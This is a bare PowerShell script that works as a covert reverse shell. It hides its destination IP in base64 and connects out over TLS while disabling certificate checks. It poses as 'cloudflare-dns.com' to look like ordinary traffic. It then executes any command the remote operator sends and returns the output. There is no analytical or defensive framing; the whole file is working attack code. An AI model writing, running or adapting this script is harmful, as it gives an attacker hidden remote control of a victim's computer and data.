
$Active = 1; 


if ($Active -ne 1) { exit }


try {
    $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
    
    
    $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
    $port = 40398;

    $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
    $NetworkStream = $TCPClient.GetStream();
    
    
    $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
    $SslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $sslProtocols, $false);

    if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
        $SslStream.Close();
        exit;
    }

    $StreamWriter = New-Object IO.StreamWriter($SslStream);
    $StreamWriter.AutoFlush = $true;

    # Function to format the shell prompt
    function WriteToStream ($String) {
        [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
        $StreamWriter.Write($String + "PS " + (Get-Location).Path + "> ");
    };

    WriteToStream '';

    
    while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1).Trim();
        
        if ($Command -eq 'exit') { break }
        
        $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
        
        WriteToStream ($Output);
    }

    $StreamWriter.Close();
    $TCPClient.Close();
} catch {
    
    exit;
}
